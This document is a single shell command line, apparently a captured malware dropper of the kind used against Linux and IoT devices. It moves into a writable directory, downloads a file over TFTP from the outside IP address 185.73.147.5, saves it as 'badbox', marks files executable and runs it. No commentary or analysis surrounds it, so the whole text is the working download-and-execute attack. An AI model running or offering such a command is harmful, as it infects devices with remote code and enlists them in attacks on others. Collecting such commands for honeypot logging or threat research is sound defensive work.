cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 185.73.147.5;cat wget >badbox;chmod +x *;./badbox
